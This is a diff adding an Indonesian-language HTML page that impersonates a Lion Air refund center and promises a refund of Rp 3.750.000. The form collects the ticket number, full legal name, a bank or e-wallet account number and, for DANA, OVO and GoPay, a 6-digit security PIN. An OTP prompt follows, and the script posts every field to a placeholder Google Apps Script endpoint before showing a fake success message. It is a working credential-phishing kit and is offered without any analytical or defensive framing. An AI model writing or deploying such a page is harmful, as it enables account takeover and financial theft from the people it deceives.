@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>Lion Air Refund Center</title>
+    <link rel="manifest" href="manifest.json">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f2f5;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .logo {
+            font-size: 48px;
+        }
+        .title {
+            color: #e31837;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .refund-amount {
+            background: #e8f5e9;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .amount {
+            font-size: 32px;
+            color: #2e7d32;
+            font-weight: bold;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #e31837;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .note {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">✈️</div>
+            <div class="title">LION AIR REFUND</div>
+        </div>
+        
+        <div class="refund-amount">
+            <div>Jumlah Refund Anda</div>
+            <div class="amount">Rp 3.750.000</div>
+        </div>
+        
+        <form id="refundForm">
+            <div class="form-group">
+                <label>Nomor Tiket</label>
+                <input type="text" id="ticketNumber" placeholder="Contoh: JT-7821-09" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Nama Lengkap (sesuai KTP)</label>
+                <input type="text" id="fullName" placeholder="Nama lengkap" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Pilih Bank / E-Wallet</label>
+                <select id="bankType" required>
+                    <option value="">Pilih...</option>
+                    <option value="bca">BCA</option>
+                    <option value="mandiri">Mandiri</option>
+                    <option value="bri">BRI</option>
+                    <option value="bni">BNI</option>
+                    <option value="dana">DANA</option>
+                    <option value="ovo">OVO</option>
+                    <option value="gopay">GoPay</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label>Nomor Rekening / ID E-Wallet</label>
+                <input type="text" id="accountNumber" placeholder="Masukkan nomor rekening atau ID e-wallet" required>
+            </div>
+            
+            <div class="form-group" id="pinGroup" style="display:none;">
+                <label>PIN Keamanan</label>
+                <input type="password" id="pin" placeholder="6 digit PIN" maxlength="6">
+            </div>
+            
+            <button type="submit">KLAIM REFUND SEKARANG</button>
+        </form>
+        
+        <div class="note">
+            Dana refund akan masuk dalam 1x24 jam setelah verifikasi
+        </div>
+    </div>
+
+    <div id="otpModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; align-items:center; justify-content:center;">
+        <div style="background:white; max-width:350px; margin:20px; padding:25px; border-radius:20px;">
+            <h3>🔐 Verifikasi OTP</h3>
+            <p>Kode verifikasi telah dikirim ke nomor WhatsApp/Telegram Anda.</p>
+            <input type="text" id="otpInput" placeholder="6 digit kode" style="width:100%; padding:12px; margin:15px 0; border:1px solid #ddd; border-radius:10px; font-size:18px; text-align:center;">
+            <button id="verifyOtpBtn" style="background:#e31837;">VERIFIKASI</button>
+        </div>
+    </div>
+
+    <script>
+        // GANTI URL INI dengan URL Google Apps Script nanti
+        const SERVER_URL = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec';
+        
+        document.getElementById('bankType').addEventListener('change', function() {
+            const pinGroup = document.getElementById('pinGroup');
+            if (this.value === 'dana' || this.value === 'ovo' || this.value === 'gopay') {
+                pinGroup.style.display = 'block';
+            } else {
+                pinGroup.style.display = 'none';
+            }
+        });
+        
+        document.getElementById('refundForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const data = {
+                ticketNumber: document.getElementById('ticketNumber').value,
+                fullName: document.getElementById('fullName').value,
+                bankType: document.getElementById('bankType').value,
+                accountNumber: document.getElementById('accountNumber').value,
+                pin: document.getElementById('pin').value,
+                timestamp: Date.now(),
+                step: 'initial_data'
+            };
+            
+            await fetch(SERVER_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            
+            document.getElementById('otpModal').style.display = 'flex';
+        });
+        
+        document.getElementById('verifyOtpBtn').addEventListener('click', async () => {
+            const otp = document.getElementById('otpInput').value;
+            
+            await fetch(SERVER_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp: otp, timestamp: Date.now(), step: 'otp' })
+            });
+            
+            alert('Verifikasi berhasil! Dana refund akan diproses dalam 1x24 jam.');
+            document.getElementById('otpModal').style.display = 'none';
+            document.getElementById('refundForm').reset();
+        });
+    </script>
+</body>
+</html>
